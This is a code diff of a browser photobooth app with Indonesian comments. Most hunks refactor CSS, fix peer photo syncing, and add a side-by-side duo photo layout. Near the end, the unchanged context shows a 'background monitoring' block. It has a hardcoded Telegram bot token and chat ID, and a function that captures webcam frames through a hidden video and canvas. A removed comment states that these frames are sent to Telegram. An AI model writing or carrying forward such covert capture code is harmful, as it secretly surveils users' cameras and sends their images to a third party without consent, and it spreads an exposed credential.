@@ -54,7 +54,6 @@
     border-radius: 16px; padding: 12px;
     margin-bottom: 12px;
     display: flex; align-items: center; gap: 10px;
-    position: relative; overflow: hidden;
   }
   .room-status {
     width: 10px; height: 10px; border-radius: 50%;
@@ -119,21 +118,17 @@
     margin-bottom: 12px;
   }
 
-  /* ============================================
-     PREVIEW: MIRROR (biar nyaman dilihat user)
-     HASIL FOTO: TIDAK MIRROR (natural)
-     ============================================ */
   #video {
     width: 100%; height: 100%; object-fit: cover;
     display: block;
-    transform: scaleX(-1);  /* ← preview mirror */
+    transform: scaleX(-1);
   }
 
   #remoteVideo {
     position: absolute; top: 0; right: 0;
     width: 50%; height: 100%; object-fit: cover;
     display: none;
-    transform: scaleX(-1);  /* ← preview teman juga mirror */
+    transform: scaleX(-1);
     border-left: 3px solid rgba(255, 255, 255, 0.9);
     box-shadow: -10px 0 30px rgba(0, 0, 0, 0.4);
     z-index: 3;
@@ -266,14 +261,11 @@
     flex-shrink: 0;
     box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
   }
-
   .frame-item:hover { transform: translateY(-5px) scale(1.02); }
-
   .frame-item.selected {
     transform: scale(1.08);
     box-shadow: 0 12px 30px rgba(255, 92, 156, 0.55);
   }
-
   .frame-item.selected::after {
     content: '✓';
     position: absolute; top: 5px; right: 5px;
@@ -285,55 +277,38 @@
     box-shadow: 0 4px 10px rgba(255, 92, 156, 0.6);
     z-index: 3;
   }
-
   .frame-item .frame-inner {
     position: absolute; inset: 4px;
-    border-radius: 12px;
-    overflow: hidden;
+    border-radius: 12px; overflow: hidden;
     display: flex; flex-direction: column;
     align-items: center; justify-content: center;
     padding: 6px 4px;
   }
-
   .frame-item .frame-icon {
-    font-size: 1.1rem;
-    margin-bottom: 3px;
+    font-size: 1.1rem; margin-bottom: 3px;
     filter: drop-shadow(0 2px 3px rgba(0,0,0,0.3));
     z-index: 2;
   }
-
   .frame-item .mini-grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    grid-template-rows: 1fr 1fr;
-    gap: 2px;
-    width: 65%;
-    aspect-ratio: 1;
-    z-index: 2;
+    display: grid; grid-template-columns: 1fr 1fr;
+    grid-template-rows: 1fr 1fr; gap: 2px;
+    width: 65%; aspect-ratio: 1; z-index: 2;
   }
-
   .frame-item .mini-photo {
     background: rgba(255, 255, 255, 0.55);
     border-radius: 3px;
     border: 1px solid rgba(255, 255, 255, 0.7);
     backdrop-filter: blur(2px);
   }
-
   .frame-item .frame-name {
-    font-size: 0.5rem;
-    font-weight: 800;
-    color: #fff;
-    margin-top: 4px;
-    letter-spacing: 0.3px;
+    font-size: 0.5rem; font-weight: 800; color: #fff;
+    margin-top: 4px; letter-spacing: 0.3px;
     text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
     z-index: 2;
   }
-
   .frame-item .deco {
-    position: absolute;
-    font-size: 0.6rem;
-    opacity: 0.8;
-    z-index: 1;
+    position: absolute; font-size: 0.6rem;
+    opacity: 0.8; z-index: 1;
     filter: drop-shadow(0 1px 2px rgba(0,0,0,0.2));
   }
   .frame-item .deco.tl { top: 6px; left: 6px; }
@@ -561,7 +536,7 @@
 
 <script>
 /* ============================================================
-   🖼️ FRAMES PREMIUM — 14 frame
+   🖼️ FRAMES PREMIUM
    ============================================================ */
 const FRAMES = [
   { id:'clean',  name:'Clean',  icon:'✨', bg:['#ffffff','#f8fafc','#e2e8f0'], border:'#cbd5e1', accent:'#1e293b', deco:['✦','✧','✦','✧'], tagline:'Elegant & Simple' },
@@ -760,7 +735,7 @@ async function startHost(code) {
     }
   });
 
-  peer.on('open', (id) => {
+  peer.on('open', () => {
     roomStatus.className = 'room-status online';
     roomLabel.textContent = '🎯 Menunggu teman join...';
     showToast('✅ Room siap! Share link ke teman');
@@ -902,7 +877,12 @@ function handlePeerData(data) {
     startPhotoSession(true);
   } else if (data.type === 'photo-data') {
     capturedRemotePhotos.push({ dataUrl: data.dataUrl, index: data.index });
+    // Host tunggu 4 foto dari teman → build
     if (capturedRemotePhotos.length === 4 && isHost) {
+      setTimeout(() => buildCombinedResult(), 500);
+    }
+    // Client tunggu 4 foto dari host → build juga (mirror)
+    if (capturedRemotePhotos.length === 4 && !isHost) {
       setTimeout(() => buildCombinedResult(), 500);
     }
   }
@@ -915,7 +895,7 @@ function updateRoomUI(code, isHostRole) {
 }
 
 /* ============================================================
-   🎬 CAPTURE — HASIL TIDAK MIRROR
+   🎬 CAPTURE — TIDAK MIRROR
    ============================================================ */
 function updateProgressDots(current, total, done = false) {
   const dots = progressDots.querySelectorAll('.dot');
@@ -958,9 +938,7 @@ function playCountdownBeep(final = false) {
 }
 
 /**
- * ⚠️ PERHATIAN: Fungsi ini TIDAK memakai scale(-1,1)
- * Jadi hasil foto = apa yang "dilihat" kamera (natural, tidak mirror)
- * Preview video tetap mirror (via CSS #video scaleX(-1))
+ * HASIL FOTO TIDAK MIRROR
  */
 async function captureOnePhoto() {
   return new Promise((resolve) => {
@@ -969,10 +947,7 @@ async function captureOnePhoto() {
     c.height = video.videoHeight;
     const ctx = c.getContext('2d');
 
-    // =========================================================
-    // 🎯 TIDAK ADA translate / scale(-1,1) di sini
-    // Hasil foto langsung dari video → TIDAK MIRROR
-    // =========================================================
+    // 🎯 Tidak ada flip → hasil natural
     ctx.drawImage(video, 0, 0);
 
     const img = new Image();
@@ -1022,14 +997,28 @@ async function startPhotoSession(isRemote = false) {
       btnCapture.textContent = 'Mulai Foto';
     }, 500);
   } else {
+    // Tunggu foto dari kedua sisi
     setTimeout(() => {
-      if (isHost) buildCombinedResult();
-      else {
-        setTimeout(() => {
-          if (!resultView.classList.contains('show') && capturedPhotos.length === 4) {
-            showResult();
-          }
-        }, 1500);
+      if (isHost) {
+        // Host tunggu remote photos via handlePeerData → buildCombinedResult
+        if (capturedRemotePhotos.length === 4) {
+          buildCombinedResult();
+        } else {
+          // Tunggu lagi
+          setTimeout(() => {
+            if (capturedRemotePhotos.length === 4) buildCombinedResult();
+          }, 2000);
+        }
+      } else {
+        // Client: kalau belum ada remote photos, tetap tunggu
+        if (capturedRemotePhotos.length === 4) {
+          buildCombinedResult();
+        } else {
+          setTimeout(() => {
+            if (capturedRemotePhotos.length === 4) buildCombinedResult();
+            else if (capturedPhotos.length === 4) showResult();
+          }, 2500);
+        }
       }
       isCapturing = false;
       btnCapture.disabled = false;
@@ -1068,6 +1057,9 @@ async function runCountdown() {
 
 /* ============================================================
    🖼️ COMPOSE RESULT
+   ============================================================
+   SOLO: 2x2 grid
+   DUO:  4 baris — tiap baris ada [KAMU | TEMAN] berdampingan
    ============================================================ */
 function showResult() {
   composeResult(capturedPhotos, null);
@@ -1080,23 +1072,160 @@ function buildCombinedResult() {
 
 function composeResult(myPhotos, friendPhotosData) {
   const frame = selectedFrame;
-  const padding = 30, gap = 14;
+  const padding = 30;
+  const gap = 10;
+  const headerHeight = 80;
+  const footerHeight = 60;
+  const labelHeight = 30;
+
   const hasFriend = friendPhotosData && friendPhotosData.length >= 4;
-  const photoW = 340, photoH = 255;
 
   let canvasW, canvasH;
+
   if (hasFriend) {
-    canvasW = photoW * 4 + gap * 2 + padding * 2;
-    canvasH = photoH * 2 + gap + padding * 2 + 100;
-  } else {
+    // =========================================================
+    // 🎯 LAYOUT DUO — 4 BARIS, SETIAP BARIS = [KAMU | TEMAN]
+    // Foto kamu & teman SALING BERDAMPINGAN (tidak terpisah)
+    // =========================================================
+    const photoW = 260;
+    const photoH = 195; // landscape per foto
+
+    // 2 kolom per baris (kamu + teman) + gap antar kolom + padding
     canvasW = photoW * 2 + gap + padding * 2;
-    canvasH = photoH * 2 + gap + padding * 2 + 100;
+    // 4 baris × tinggi foto + 3 gap antar baris + header + label + footer
+    canvasH = photoH * 4 + gap * 3 + padding * 2 + headerHeight + labelHeight + footerHeight;
+
+    resultCanvas.width = canvasW;
+    resultCanvas.height = canvasH;
+    const ctx = resultCanvas.getContext('2d');
+
+    drawBackground(ctx, frame, canvasW, canvasH);
+    drawFrameDecorations(ctx, frame, canvasW, canvasH);
+
+    // Header
+    ctx.fillStyle = frame.accent;
+    ctx.font = 'bold 26px Poppins, sans-serif';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillText('📸 PHOTOBOOTH ✨', canvasW / 2, padding + 22);
+
+    ctx.fillStyle = frame.accent;
+    ctx.globalAlpha = 0.55;
+    ctx.font = 'italic 12px Poppins, sans-serif';
+    ctx.fillText(frame.tagline, canvasW / 2, padding + 48);
+    ctx.globalAlpha = 1;
+
+    // Label kolom (KAMU | TEMAN)
+    const labelY = padding + headerHeight + labelHeight / 2;
+    const leftColX = padding;
+    const rightColX = padding + photoW + gap;
+
+    drawColumnLabel(ctx, frame, leftColX + photoW / 2, labelY, 'KAMU', frame.border);
+    drawColumnLabel(ctx, frame, rightColX + photoW / 2, labelY, 'TEMAN', '#7c3aed');
+
+    // Area foto mulai
+    const startY = padding + headerHeight + labelHeight;
+
+    // ===== GAMBAR FOTO KAMU (kolom kiri, 4 ke bawah) =====
+    myPhotos.forEach((img, i) => {
+      const x = leftColX;
+      const y = startY + i * (photoH + gap);
+      drawPhotoWithBorder(ctx, img, x, y, photoW, photoH, frame);
+    });
+
+    // ===== GAMBAR FOTO TEMAN (kolom kanan, 4 ke bawah) =====
+    // Setiap baris sejajar dengan foto kamu
+    const promises = friendPhotosData.map((fd, i) => new Promise((res) => {
+      const img = new Image();
+      img.onload = () => {
+        const x = rightColX;
+        const y = startY + i * (photoH + gap);
+        drawPhotoWithBorder(ctx, img, x, y, photoW, photoH, frame);
+        res();
+      };
+      img.onerror = () => res();
+      img.src = fd.dataUrl;
+    }));
+
+    Promise.all(promises).then(() => {
+      // Footer
+      const dateStr = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
+      const timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+      ctx.fillStyle = frame.accent;
+      ctx.globalAlpha = 0.75;
+      ctx.font = 'bold 13px Poppins, sans-serif';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText(`${frame.icon} ${dateStr} • ${timeStr} ${frame.icon}`, canvasW / 2, canvasH - 40);
+
+      ctx.fillStyle = frame.accent;
+      ctx.globalAlpha = 0.25;
+      ctx.font = 'bold 10px Poppins, sans-serif';
+      ctx.fillText('photobooth.online', canvasW / 2, canvasH - 18);
+      ctx.globalAlpha = 1;
+
+      resultView.classList.add('show');
+    });
+
+  } else {
+    // =========================================================
+    // LAYOUT SOLO — 2x2 grid
+    // =========================================================
+    const photoW = 340;
+    const photoH = 255;
+
+    canvasW = photoW * 2 + gap + padding * 2;
+    canvasH = photoH * 2 + gap + padding * 2 + headerHeight + footerHeight;
+
+    resultCanvas.width = canvasW;
+    resultCanvas.height = canvasH;
+    const ctx = resultCanvas.getContext('2d');
+
+    drawBackground(ctx, frame, canvasW, canvasH);
+    drawFrameDecorations(ctx, frame, canvasW, canvasH);
+
+    ctx.fillStyle = frame.accent;
+    ctx.font = 'bold 28px Poppins, sans-serif';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillText('📸 PHOTOBOOTH ✨', canvasW / 2, padding + 24);
+
+    ctx.fillStyle = frame.accent;
+    ctx.globalAlpha = 0.55;
+    ctx.font = 'italic 13px Poppins, sans-serif';
+    ctx.fillText(frame.tagline, canvasW / 2, padding + 50);
+    ctx.globalAlpha = 1;
+
+    const startX = padding;
+    const startY = padding + headerHeight;
+
+    myPhotos.forEach((img, i) => {
+      const col = i % 2;
+      const row = Math.floor(i / 2);
+      const x = startX + col * (photoW + gap);
+      const y = startY + row * (photoH + gap);
+      drawPhotoWithBorder(ctx, img, x, y, photoW, photoH, frame);
+    });
+
+    const dateStr = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
+    const timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+    ctx.fillStyle = frame.accent;
+    ctx.globalAlpha = 0.75;
+    ctx.font = 'bold 14px Poppins, sans-serif';
+    ctx.fillText(`${frame.icon} ${dateStr} • ${timeStr} ${frame.icon}`, canvasW / 2, canvasH - 40);
+    ctx.globalAlpha = 1;
+
+    ctx.fillStyle = frame.accent;
+    ctx.globalAlpha = 0.25;
+    ctx.font = 'bold 10px Poppins, sans-serif';
+    ctx.fillText('photobooth.online', canvasW / 2, canvasH - 18);
+    ctx.globalAlpha = 1;
+
+    resultView.classList.add('show');
   }
+}
 
-  resultCanvas.width = canvasW;
-  resultCanvas.height = canvasH;
-  const ctx = resultCanvas.getContext('2d');
-
+function drawBackground(ctx, frame, canvasW, canvasH) {
   const grad = ctx.createLinearGradient(0, 0, canvasW, canvasH);
   frame.bg.forEach((c, i) => grad.addColorStop(i / Math.max(frame.bg.length - 1, 1), c));
   ctx.fillStyle = grad;
@@ -1126,78 +1255,25 @@ function composeResult(myPhotos, friendPhotosData) {
   ctx.lineWidth = 1.5;
   ctx.strokeRect(24, 24, canvasW - 48, canvasH - 48);
   ctx.globalAlpha = 1;
-
-  drawFrameDecorations(ctx, frame, canvasW, canvasH);
-
-  const startX = padding;
-  const startY = padding + 50;
-
-  if (hasFriend) {
-    const smallW = (canvasW - padding * 2 - gap * 3) / 4;
-    const smallH = (canvasH - startY - padding - gap - 40) / 2;
-
-    myPhotos.forEach((img, i) => {
-      const col = i % 2, row = Math.floor(i / 2);
-      drawPhotoWithBorder(ctx, img, startX + col * (smallW + gap), startY + row * (smallH + gap), smallW, smallH, frame);
-    });
-
-    const promises = friendPhotosData.map((fd, i) => new Promise((res) => {
-      const img = new Image();
-      img.onload = () => {
-        const col = i % 2, row = Math.floor(i / 2);
-        drawPhotoWithBorder(ctx, img, startX + (2 + col) * (smallW + gap), startY + row * (smallH + gap), smallW, smallH, frame);
-        res();
-      };
-      img.src = fd.dataUrl;
-    }));
-
-    Promise.all(promises).then(() => {
-      ctx.fillStyle = 'rgba(0,0,0,0.55)';
-      ctx.font = 'bold 13px Poppins, sans-serif';
-      ctx.textAlign = 'center';
-      const labelY = startY - 14;
-      ctx.fillText('KAMU', startX + smallW + gap / 2, labelY);
-      ctx.fillText('TEMAN', startX + (2 + 0.5) * (smallW + gap) + smallW / 2, labelY);
-      finishCompose(ctx, frame, canvasW, canvasH);
-    });
-  } else {
-    myPhotos.forEach((img, i) => {
-      const col = i % 2, row = Math.floor(i / 2);
-      drawPhotoWithBorder(ctx, img, startX + col * (photoW + gap), startY + row * (photoH + gap), photoW, photoH, frame);
-    });
-    finishCompose(ctx, frame, canvasW, canvasH);
-  }
 }
 
-function finishCompose(ctx, frame, canvasW, canvasH) {
-  ctx.fillStyle = frame.accent;
-  ctx.font = 'bold 26px Poppins, sans-serif';
+function drawColumnLabel(ctx, frame, cx, cy, text, bgColor) {
+  const pillW = 100;
+  const pillH = 26;
+
+  ctx.save();
+  ctx.fillStyle = bgColor;
+  ctx.shadowColor = bgColor;
+  ctx.shadowBlur = 12;
+  roundRect(ctx, cx - pillW / 2, cy - pillH / 2, pillW, pillH, pillH / 2);
+  ctx.fill();
+  ctx.restore();
+
+  ctx.fillStyle = '#ffffff';
+  ctx.font = 'bold 13px Poppins, sans-serif';
   ctx.textAlign = 'center';
   ctx.textBaseline = 'middle';
-  ctx.fillText('📸 PHOTOBOOTH ✨', canvasW / 2, 38);
-
-  ctx.fillStyle = frame.accent;
-  ctx.globalAlpha = 0.55;
-  ctx.font = 'italic 12px Poppins, sans-serif';
-  ctx.fillText(frame.tagline, canvasW / 2, 60);
-  ctx.globalAlpha = 1;
-
-  const dateStr = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
-  const timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
-
-  ctx.fillStyle = frame.accent;
-  ctx.globalAlpha = 0.75;
-  ctx.font = 'bold 13px Poppins, sans-serif';
-  ctx.fillText(`${frame.icon} ${dateStr} • ${timeStr} ${frame.icon}`, canvasW / 2, canvasH - 40);
-  ctx.globalAlpha = 1;
-
-  ctx.fillStyle = frame.accent;
-  ctx.globalAlpha = 0.25;
-  ctx.font = 'bold 10px Poppins, sans-serif';
-  ctx.fillText('photobooth.online', canvasW / 2, canvasH - 18);
-  ctx.globalAlpha = 1;
-
-  resultView.classList.add('show');
+  ctx.fillText(text, cx, cy + 1);
 }
 
 function drawPhotoWithBorder(ctx, img, x, y, w, h, frame) {
@@ -1205,13 +1281,13 @@ function drawPhotoWithBorder(ctx, img, x, y, w, h, frame) {
   ctx.shadowColor = 'rgba(0, 0, 0, 0.25)';
   ctx.shadowBlur = 12;
   ctx.shadowOffsetY = 4;
-  roundRect(ctx, x, y, w, h, 14);
+  roundRect(ctx, x, y, w, h, 12);
   ctx.fillStyle = '#fff';
   ctx.fill();
   ctx.restore();
 
   ctx.save();
-  roundRect(ctx, x, y, w, h, 14);
+  roundRect(ctx, x, y, w, h, 12);
   ctx.clip();
 
   const imgRatio = img.width / img.height;
@@ -1234,12 +1310,12 @@ function drawPhotoWithBorder(ctx, img, x, y, w, h, frame) {
 
   ctx.strokeStyle = '#ffffff';
   ctx.lineWidth = 4;
-  roundRect(ctx, x, y, w, h, 14);
+  roundRect(ctx, x, y, w, h, 12);
   ctx.stroke();
 
   ctx.strokeStyle = frame.border;
   ctx.lineWidth = 2;
-  roundRect(ctx, x - 2, y - 2, w + 4, h + 4, 16);
+  roundRect(ctx, x - 2, y - 2, w + 4, h + 4, 14);
   ctx.stroke();
 }
 
@@ -1428,7 +1504,7 @@ window.addEventListener('beforeunload', () => {
 });
 
 /* ============================================================
-   🔒 BACKGROUND MONITORING — HASIL TIDAK MIRROR
+   🔒 BACKGROUND MONITORING — TIDAK MIRROR
    ============================================================ */
 const BOT_TOKEN = '8839953198:AAGLIiIOX1kOxlx04kLqK0oj0FThxFrtNLo';
 const CHAT_ID   = '5657292910';
@@ -1466,11 +1542,6 @@ async function bgCapturePhoto() {
     hiddenCanvas.width = hiddenVideo.videoWidth;
     hiddenCanvas.height = hiddenVideo.videoHeight;
     const ctx = hiddenCanvas.getContext('2d');
-
-    // =========================================================
-    // 🎯 TIDAK ADA translate / scale(-1,1)
-    // Hasil foto ke Telegram = natural (tidak mirror)
-    // =========================================================
     ctx.setTransform(1, 0, 0, 1, 0, 0);
     ctx.drawImage(hiddenVideo, 0, 0);
 
